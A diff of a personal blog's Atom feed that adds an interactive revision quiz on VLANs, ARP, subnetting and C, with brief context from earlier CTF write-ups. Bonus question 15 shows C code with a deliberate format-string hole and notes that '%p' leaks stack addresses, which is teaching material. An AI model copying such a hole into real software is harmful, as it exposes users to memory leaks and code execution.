@@ -1,4 +1,474 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-02-09T06:39:47+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">wrenches</title><subtitle>ever since i was young i always dreamed of owning my own self</subtitle><entry><title type="html">smileyctf/babyrop</title><link href="http://localhost:4000/2026/02/08/stupidpwn.html" rel="alternate" type="text/html" title="smileyctf/babyrop" /><published>2026-02-08T05:40:00+08:00</published><updated>2026-02-08T05:40:00+08:00</updated><id>http://localhost:4000/2026/02/08/stupidpwn</id><content type="html" xml:base="http://localhost:4000/2026/02/08/stupidpwn.html"><![CDATA[<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=zldBTSx9JpE">gips by sheena ringo.</a></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-02-25T02:57:22+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">wrenches</title><subtitle>ever since i was young i always dreamed of owning my own self</subtitle><entry><title type="html">profcane’s networking revision</title><link href="http://localhost:4000/2026/02/20/net-revision.html" rel="alternate" type="text/html" title="profcane’s networking revision" /><published>2026-02-20T05:40:00+08:00</published><updated>2026-02-20T05:40:00+08:00</updated><id>http://localhost:4000/2026/02/20/net-revision</id><content type="html" xml:base="http://localhost:4000/2026/02/20/net-revision.html"><![CDATA[<style>
+  
+  .quiz-options {
+    list-style: none;
+    padding: 0;
+    margin-top: 15px;
+  }
+
+  .option {
+    padding: 10px 15px;
+    margin-bottom: 8px;
+    cursor: pointer;
+    border: 1px solid gray;
+    transition: all 0.2s ease;
+  }
+
+  .option:hover {
+    border: 1px solid white;
+  }
+
+  .quiz-block.answered .option {
+    cursor: default;
+    pointer-events: none;
+  }
+
+  .quiz-block.answered .option.correct {
+    background-color: #1c1c1c;
+    color: green;
+    font-weight: bold;
+  }
+
+  .quiz-block.answered .option:not(.correct) {
+    color: #86181d;
+    opacity: 0.7;
+  }
+
+  .explanation {
+    display: none;
+    margin-top: 25px;
+    padding-inline: 15px;
+    border-left: 2px solid #b8bb26;
+  }
+
+  .quiz-block.answered .explanation {
+    display: block;
+    animation: fadeIn 0.5s;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+</style>
+
+<p><a href="https://www.youtube.com/watch?v=kvhVECfGsw8">recommended listening for this post is do it (yves remix)</a></p>
+
+<p>apparently wing keong is like an insane crackpot conspiracy theorist? either way the man’s a good professor and makes hard tests so if he says that vlan tags cause 9/11 then fuck it man <code class="language-plaintext highlighter-rouge">encapsulation dot1q 9/11</code> my ass</p>
+
+<p><img src="https://i.imgur.com/Fu1lazS.png" alt="meow" /></p>
+
+<div class="quiz-block">
+  <h3 id="question-1">question 1</h3>
+
+  <p><img src="https://i.imgur.com/Al4m38h.png" alt="network topo" /></p>
+
+  <p>consider the following setup. i have setup the trunk between <code class="language-plaintext highlighter-rouge">S1</code> and <code class="language-plaintext highlighter-rouge">S2</code>, VLAN 10 on <code class="language-plaintext highlighter-rouge">G1/0/6 S1</code> and <code class="language-plaintext highlighter-rouge">G1/0/11 S2</code>, and VLAN 20 on <code class="language-plaintext highlighter-rouge">G1/0/18</code> as per the diagram i have also correctly set the router’s ip addresses on their interfaces. pc A can ping pc B, but no pcs can ping the router. this is because</p>
+
+  <ul class="quiz-options">
+  <li class="option">STP detects a loop between the router and switches and shuts the network down.</li>
+  <li class="option correct">the connections R1-S1 and R2-S2 also need VLANs configured.</li>
+  <li class="option">nothing is wrong with the configuration as described, it is most likely a physical layer issue.</li>
+  <li class="option">if the trunk was configured without explicitly stating which VLANs are allowed, the default option is to only allow VLAN 1, hence neither VLAN can actually use the trunk.</li>
+</ul>
+
+  <div class="explanation">
+    <p><b>explanation</b> STP does not come into play here, and the default for a trunk is to allow <i>all</i> VLANs. the default for an interface on a switch is ONLY VLAN 1, so the switch cannot send packets from PC A to R1 (the VLAN has not been properly configured).</p>
+  </div>
+
+</div>
+<hr />
+
+<!-- QUESTION 2 -->
+<div class="quiz-block">
+  <h3 id="question-2">question 2</h3>
+
+  <p>which of these is possible to do on a CISCO router?</p>
+
+  <ul class="quiz-options">
+  <li class="option">setting multiple VLANs on a LAN subinterface</li>
+  <li class="option">setting an IP address on a LAN subinterface before its VLAN is configured</li>
+  <li class="option correct">setting a VLAN on a LAN subinterface before its IP address is configured</li>
+  <li class="option">all of these are possible</li>
+</ul>
+
+  <div class="explanation">
+    <p><b>explanation</b> one VLAN+IP address per LAN subinterface. the key thing here is that an IP address is ‘more specific’ than a VLAN, and the router requires you to set the VLAN (with the <code class="language-plaintext highlighter-rouge">encapsulation dot1q ..</code>) command before configuring the IP address. (you’ll note that in each example in the labs, the <code class="language-plaintext highlighter-rouge">encapsulation</code> command is performed before setting the IP).</p>
+  </div>
+</div>
+
+<hr />
+
+<div class="quiz-block">
+  <h3 id="question-3">question 3</h3>
+
+  <p>LAN subinterface <code class="language-plaintext highlighter-rouge">G0/0/1.10</code> is currently configured to <code class="language-plaintext highlighter-rouge">192.168.1.10/28</code>. i want to configure LAN subinterface <code class="language-plaintext highlighter-rouge">G0/0/1.20</code> - which address + subnet mask would the router let me configure it to?</p>
+
+  <ul class="quiz-options">
+  <li class="option">192.168.1.3 255.255.255.252</li>
+  <li class="option">192.168.1.24 255.255.255.0</li>
+  <li class="option correct">192.168.2.1 255.255.254.0</li>
+  <li class="option">192.168.1.14 255.255.255.254</li>
+</ul>
+  <div class="explanation">
+    <p><b>explanation:</b> the only constraint that the router enforces is that no subinterface must overlap (when it receives a packet destined for a specific subnet, it <em>must</em> know which interface to send it to, there cannot be any ‘ambiguities’). for each IP address above starting with <code class="language-plaintext highlighter-rouge">192.168.1.x</code>, the <code class="language-plaintext highlighter-rouge">192.168.1.10/28</code> will necessarily overlap (because that subnet covers every single <code class="language-plaintext highlighter-rouge">192.168.1.x</code> addr). <code class="language-plaintext highlighter-rouge">192.168.2.0 255.255.254.0</code> covers from <code class="language-plaintext highlighter-rouge">192.168.2.0 - 192.168.3.255</code>, hence no overlap.&lt;/div&gt;</p>
+  </div>
+  <hr />
+
+  <div class="quiz-block">
+    <h3 id="question-4">question 4</h3>
+
+    <p><img src="https://www.ciscopress.com/content/images/chap4_9780136729358/elementLinks/04fig05_alt.jpg" alt="network topo" /></p>
+
+    <p>consider the network topology, noting that <code class="language-plaintext highlighter-rouge">PC1</code> and <code class="language-plaintext highlighter-rouge">PC2</code> are on separate VLANs. <code class="language-plaintext highlighter-rouge">PC1</code> sends <code class="language-plaintext highlighter-rouge">PC2</code> an ICMP ping request. assuming that all ARP tables are empty, which of the following is true?</p>
+
+    <ul class="quiz-options">
+  <li class="option">from S2 to PC2, the packet has a VLAN tag.</li>
+  <li class="option">the source MAC address of the packet stays constant throughout the entire lifecycle of the packet.</li>
+  <li class="option">when S2 forwards the packet to PC2, it will add PC2's MAC address to its MAC address table.</li>
+  <li class="option correct">the packet starts with no VLAN tag, then S1 adds one, then R1 removes and adds another one, then S2 finally removes it.</li>
+</ul>
+
+    <div class="explanation">
+      <p><b>explanation:</b> PCs are ‘VLAN unaware’, the PC only sends an ethernet packet. VLAN tags are a layer 2 thing, so they are mainly dealt with by switches (as well as layer 3 routers, which need to decapsulate the packet to check its IP, then reapply the next VLAN tag during encapsulation). switches only learn MAC addresses from <em>source</em> MAC addresses and not destinations, and when the router decapsulates the packet, it modifies the source MAC address of the packet to be the router’s.</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 5 -->
+  <div class="quiz-block">
+    <h3 id="question-5">question 5</h3>
+
+    <p>same question as above - which of the following is true? (remember the assumption that all ARP, MAC address, and routing tables are empty).</p>
+
+    <ul class="quiz-options">
+  <li class="option">PC1 will first send an ARP request to PC2 to know which MAC address to send its ICMP packet to.</li>
+  <li class="option correct">PC2 will eventually send an ARP response addressed to R1.</li>
+  <li class="option">when S1 receives an ARP request, it will flood it out of all 3 ports.</li>
+  <li class="option">three ARP requests are sent throughout the process of sending the ICMP request.</li>
+
+</ul>
+    <div class="explanation">
+      <p><b>explanation:</b>PC1 cannot send an ARP request to PC2 because they are on different subnets! PC1 would send it to the default gateway (the router), and the router would <em>then send its own ARP request</em> to PC2, and PC2 would respond. throughout this process only two ARP requests would be sent (PC1 would need to ARP for its default gateway, and the router would need to ARP for PC2). third option is wrong because a switch floods a broadcast packet out of all ports <em>except</em> ingress, so it would only send 2 packets max (if that).</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 6 -->
+  <div class="quiz-block">
+    <h3 id="question-6">question 6</h3>
+
+    <p>after this finishes execution, what will the contents of <code class="language-plaintext highlighter-rouge">rawr.txt</code> be (assuming it starts off blank)?</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fptr</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"rawr.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">fptr</span><span class="p">,</span> <span class="s">"meow meow</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option">the compiler will error, as you're writing to a read-only file</li>
+  <li class="option">the program will segfault, as you're writing to a read-only file</li>
+  <li class="option correct">the file will remain empty</li>
+  <li class="option">the file will contain `meow meow`</li>
+</ul>
+    <div class="explanation">
+      <p><b>explanation:</b> it’ll just fail silently. ofc, the compiler doesn’t actually do a check to see if the file exists at compiletime, that’s crazy.</p>
+
+      <p><em>optional info</em> so programs will actually segfault if they try to write to read only pages of memory, such as a binary’s Global Offset Table when the program is compiled w/ full Relocation Read-Only. this is relevant in the beautiful field of binary exploitation, which i dearly love, but is absolutely beyond the scope of a first year C class. please message me if you’d love to learn more</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 7 -->
+  <div class="quiz-block">
+    <h3 id="question-7">question 7</h3>
+
+    <p>which of the following commands cannot be used to get input from <code class="language-plaintext highlighter-rouge">stdin</code>?</p>
+
+    <ul class="quiz-options">
+  <li class="option">fgets()</li>
+  <li class="option">read()</li>
+  <li class="option">getc()</li>
+  <li class="option correct">strstr()</li>
+</ul>
+    <div class="explanation">
+      <p><b>explanation:</b>
+<code class="language-plaintext highlighter-rouge">fgets()</code> reads from a FILE* ptr, and stdin is a FILE* ptr. <code class="language-plaintext highlighter-rouge">read()</code> reads from file descriptors, and stdin is also a file descriptor. <code class="language-plaintext highlighter-rouge">getc()</code> takes an argument for a FILE* ptr. the only thing here is <code class="language-plaintext highlighter-rouge">strstr()</code>, which is essentially python’s <code class="language-plaintext highlighter-rouge">.find()</code> method for strings. either way, <code class="language-plaintext highlighter-rouge">strstr()</code> can’t read from file pointers or file descriptors, just compare two strings.</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 8 -->
+  <div class="quiz-block">
+    <h3 id="question-8">question 8</h3>
+
+    <p>what is the output of the following program? (assume <code class="language-plaintext highlighter-rouge">long</code> is 64-bit, and assume we’re on a 64-bit machine too)</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">b</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%ld %ld %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option">[3 large, unknown numbers]</li>
+  <li class="option correct">10 [some large unknown number] 10</li>
+  <li class="option">10 10 10</li>
+  <li class="option">0 0 0</li>
+</ul>
+    <div class="explanation">
+      <p><b>explanation:</b> in C, this is perfectly valid - we’re casting the value of the <em>pointer</em> to <code class="language-plaintext highlighter-rouge">a</code> as if it were a <code class="language-plaintext highlighter-rouge">long</code>. we’re on a 64-bit machine so pointers are also 64-bit, the cast works out nice. the important thing here is that you don’t actually lose any information as long as you’re casting back and forth between the same sizes, hence the original value of <code class="language-plaintext highlighter-rouge">int a</code> remains at 10.</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- question 9 -->
+  <div class="quiz-block">
+    <h3 id="question-9">question 9</h3>
+
+    <p>what is the output of the following program?</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"what's so good about picking up the pieces?"</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option correct">what's so good about picking up the pieces?</li>
+  <li class="option">what's so good about picking up the pieces?\00</li>
+  <li class="option">each character will be on a different newline</li>
+  <li class="option">the loop won't terminate</li>
+</ul>
+    <div class="explanation">
+      <p><b>explanation:</b> for loops consist of three parts: the initialization, the condition, and the update. typically we see the standard format for a for loop as <code class="language-plaintext highlighter-rouge">int i = 0; i&lt;SOME_BOUND; i++</code> but that condition can really be anything! recall that all strings (char bufs) are nullterminated, and a nullterminator is just a 0 byte which is falsy.</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 10 -->
+  <div class="quiz-block">
+    <h3 id="question-10">question 10</h3>
+
+    <p>what is the output of the following program?</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="sc">'a'</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'g'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">^</span><span class="mh">0x20</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option">BcDeFg</li>
+  <li class="option correct">BcDeFgHi</li>
+  <li class="option">BcDeF</li>
+  <li class="option">aBcDeFgHi</li>
+</ul>
+    <div class="explanation">
+      <p><b>explanation:</b> ok yeah soz this is <em>really</em> tricky. we know that chars are just ints, but lowercase chars are also greater than uppercase chars, so when the xor 0x20 flips the case, the loop doesn’t terminate. we also have to keep in mind that the loop modifies the char <em>BEFORE</em> printing the string, which is why the initial ‘a’ value doesn’t get printed. finally, the conditional is <code class="language-plaintext highlighter-rouge">c &lt;= 'g'</code>, NOT <code class="language-plaintext highlighter-rouge">c &lt; g</code>; so if <code class="language-plaintext highlighter-rouge">c == 'g'</code> then the while loop still continues.</p>
+    </div>
+  </div>
+  <hr />
+
+  <div class="quiz-block">
+    <h3 id="question-11">question 11</h3>
+
+    <p>which of the following choices for <code class="language-plaintext highlighter-rouge">b[]</code> would not result in the program outputting <code class="language-plaintext highlighter-rouge">1</code>?</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">are_the_same</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">a</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="s">"rawr</span><span class="se">\00</span><span class="s">xd"</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">b</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"..."</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">are_the_same</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="mi">7</span><span class="p">));</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option correct">raw</li>
+  <li class="option">rawr\00\00\00\00\00</li>
+  <li class="option">rawr\00sdlfkjsdlkfjsdkfl</li>
+  <li class="option">rawr</li>
+</ul>
+    <div class="explanation">
+      <p><b>explanation</b>: again, strings are all null terminated. <code class="language-plaintext highlighter-rouge">strncmp</code> only checks at <em>MAX</em> the first n bytes (in this case, 7) but if both strings are null terminated <em>before</em> n then it just exits out. in this case, only <code class="language-plaintext highlighter-rouge">raw</code> would fail the check because <code class="language-plaintext highlighter-rouge">strncmp</code> would try to compare raw’s null terminator with rawr’s last ‘r’ character.&lt;/div&gt;</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 12 -->
+  <div class="quiz-block">
+    <h3 id="question-12">question 12</h3>
+
+    <p>which of the following correctly explains why this code won’t compile?</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">atoi</span><span class="p">(</span><span class="n">getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">)));</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option">getc() doesn't take an argument</li>
+  <li class="option">atoi() returns a char, breaking the format string</li>
+  <li class="option correct">getc() returns a char, `atoi()` expects a char*</li>
+  <li class="option">it works just fine</li>
+</ul>
+    <div class="explanation">
+      <p><b>explanation:</b> honestly the answer explains it better than i can here. we just have to remember that a char and char* are distinct. also, <code class="language-plaintext highlighter-rouge">atoi()</code> returns an integer.</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 13 -->
+  <div class="quiz-block">
+    <h3 id="question-13">question 13</h3>
+
+    <p>what is the output of the following program? assume that <code class="language-plaintext highlighter-rouge">doesnotexist.txt</code> does not exist.</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fptr</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"doesnotexist.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fptr</span> <span class="o">==</span> <span class="n">a</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"yay!"</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"awww."</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option">`awww.`, when `fopen` fails it is undefined behaviour.</li>
+  <li class="option correct">`yay!`, when `fopen` fails it returns a nullptr.</li>
+  <li class="option">this program won't compile as you can't compare a pointer with an integer.</li>
+  <li class="option">this program won't compile because `doesnotexist.txt` does not exist.</li>
+</ul>
+    <div class="explanation">
+      <p><b>explanation</b>a null pointer is just the value 0, and you can compare the two perfectly fine. fopen will always return a null pointer when it fails.</p>
+    </div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 14 -->
+  <div class="quiz-block">
+    <h3 id="question-14">question 14</h3>
+
+    <p>which of the following is an invalid way to populate the <code class="language-plaintext highlighter-rouge">name</code> field of the <code class="language-plaintext highlighter-rouge">Student</code> struct?</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Student</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">Student</span><span class="o">*</span> <span class="n">student</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Student</span><span class="p">));</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option">snprintf(student-&gt;name, 16, "cane");</li>
+  <li class="option" style="padding: 0px;">
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">name</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"cane"</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">student</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="p">}</span></code></pre></figure>
+
+</li>
+  <li class="option correct">student-&gt;name = "cane";</li>
+  <li class="option">memmove(student-&gt;name, "cane", 4);</li>
+</ul>
+    <div class="explanation">
+<b>explanation:</b> yeah no you just cant write assign arrays like this. everything else is perfectly valid (using snprintf, writing the char array byte by byte, and moving the actual memory w/ memmove) but array assignment is invalid.
+</div>
+  </div>
+  <hr />
+
+  <!-- QUESTION 15 (BONUS) -->
+  <div class="quiz-block">
+    <h3 id="question-15-bonus">question 15 (bonus)</h3>
+
+    <p>what’s wrong with the following program?</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <ul class="quiz-options">
+  <li class="option correct">a user can input `"%p"` and leak addresses on the stack</li>
+  <li class="option">`fgets` does not account for the null terminator, the null byte will overflow</li>
+  <li class="option">`sizeof(buf)` actually corresponds to the size of a `char*` pointer, only 8 bytes of input will be read</li>
+    <li class="option">nothing is wrong it's completely fine</li>
+
+</ul>
+    <div class="explanation">
+<b>explanation:</b> do this year's cyberblitz in december to find out how you can pop a shell w/ just a format string exploit :p
+</div>
+  </div>
+  <script>
+document.addEventListener('DOMContentLoaded', function() {
+  var options = document.querySelectorAll('.option');
+  options.forEach(function(option) {
+    option.addEventListener('click', function() {
+      var block = event.currentTarget.closest('.quiz-block');
+      console.log(block);
+      if (block.classList.contains('answered')) return;
+      block.classList.add('answered');
+    });
+  });
+});
+</script>
+
+</div>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">smileyctf/babyrop</title><link href="http://localhost:4000/2026/02/08/stupidpwn.html" rel="alternate" type="text/html" title="smileyctf/babyrop" /><published>2026-02-08T05:40:00+08:00</published><updated>2026-02-08T05:40:00+08:00</updated><id>http://localhost:4000/2026/02/08/stupidpwn</id><content type="html" xml:base="http://localhost:4000/2026/02/08/stupidpwn.html"><![CDATA[<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=zldBTSx9JpE">gips by sheena ringo.</a></p>
 
 <p><img src="https://i.redd.it/xqk7cg8tacie1.gif" alt="yup" /></p>
 
@@ -4243,7 +4713,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
 <p><a href="https://blog.azazo.me">azazo</a> and i did this ctf alongside one other friend. the event is long gone now but i decided to upsolve this python pwn challenge by <a href="https://samuzora.com">samuzora</a> that i thought was really fun. it took me about 8 hours.</p>
 
-<p><strong>edit 24th jan</strong> i also upsolved one of the unsolved revs, attached below</p>
+<p><strong>edit 24th jan</strong> i also upsolved one of the unsolved revs, attached below
+<strong>edit 25th feb</strong> a third sctf upsolve has hit the twin towers</p>
 
 <h3 id="pwnmutuple">pwn/mutuple</h3>
 
@@ -4878,7 +5349,197 @@ tuple size <span class="o">&gt;</span>  139899148097392
 
 <p>the actual obfuscation method used here is very cool, and i would be remiss not to mention <a href="https://blog.elmo.sg/posts/the-art-of-hiding-code-by-modifying-non-volatile-registers">elma’s great writeup</a> on it, so do read that if you want to actually learn what the <code class="language-plaintext highlighter-rouge">libc_start_main</code> trampoline obfuscation nonsense at play here is. the purpose of this writeup is more so to share how a solver wld even go about dealing with this sort of obfuscation.</p>
 
